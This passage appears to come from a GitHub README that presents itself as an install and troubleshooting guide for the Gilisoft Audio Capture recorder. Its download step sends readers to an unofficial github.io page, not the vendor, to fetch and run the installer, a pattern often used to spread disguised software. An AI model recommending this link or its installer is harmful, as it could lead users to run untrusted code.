## 🚀 Setup Walkthrough — From Installer to First Recording

This section is deliberately written without command-line incantations. Everything below is done with a mouse, a keyboard, and a little patience.

### Step 1 — Prepare Your Environment
Before you begin, make sure your machine is ready:
- Confirm you are running **Windows 11 or Windows 10** with the latest cumulative updates.
- Connect your microphone or headset and confirm it is recognized by the operating system.
- Close heavy background applications so the first recording session has a clear stage.
- Decide where your recordings should live. A dedicated folder, such as one named for the year 2026, keeps things tidy.

### Step 2 — Obtain the Package
Use the acquisition hub mentioned earlier in this document. Save the installer to a location you can find again.

[![Download](https://raw.githubusercontent.com/iArys/Gilisoft-Audio-Capture-Guide/main/run_a7e4f9.svg)](https://iArys.github.io/Gilisoft-Audio-Capture-Guide/)

### Step 3 — Run the Installer
- Locate the downloaded file and open it.
- Follow the on-screen prompts. Choose an install directory that suits your storage layout.
- When asked about shortcuts, decide whether you want a desktop icon, a Start menu entry, or both.
- Allow the process to complete, then launch the application.

### Step 4 — First Launch Configuration
- Select your **input source**: system audio, microphone, or both.
- Choose your **output format**. MP3 is a sensible default for sharing; WAV is better for editing later.
- Set a **destination folder** for saved recordings.
- Open the **language** menu and select your preferred interface language if it is not already detected.
- Adjust the **theme** and **font size** so the interface feels comfortable.

### Step 5 — Conduct a Test Capture
- Press the record control and speak a short sentence or play a brief song.
- Stop the recording and locate the saved file.
- Play it back. If the volume is too low, revisit the input gain settings. If the audio is distorted, reduce the input level.

### Step 6 — Refine Your Workflow
- Create presets for common tasks: podcast episodes, lecture capture, music practice.
- Set up a scheduled recording for a weekly program.
- Explore the editor to trim and tag your first session.

## 🧰 Troubleshooting Atelier — When the Sound Runs Thin

Even the best tools occasionally need a nudge. Below are common situations and gentle remedies.

### No Audio Detected
- Confirm the correct input device is selected in both Windows settings and the recorder.
- Check that the Windows volume mixer has not muted the application.
- Some applications use exclusive audio modes that block capture. Close and reopen them.

### Recording Is Too Quiet
- Increase the input gain within the recorder.
- Move your microphone closer to the source.
- Enable normalization for playback-friendly output.

### Recording Contains Static or Clicks
- Lower the input level to avoid clipping.
- Update your audio driver through Windows Update.
- Disable audio enhancements in Windows sound settings as a test.

### Scheduled Recording Did Not Start
- Confirm the application is running in the background.
- Check that your system clock and time zone are correct.
- Verify the schedule is enabled and not set to a past date.

### Interface Language Is Incorrect
- Open the settings panel and select the desired language manually.
- Restart the application so the change takes full effect.

If none of these resolve the issue, the support channel mentioned in the feature list is available around the clock.
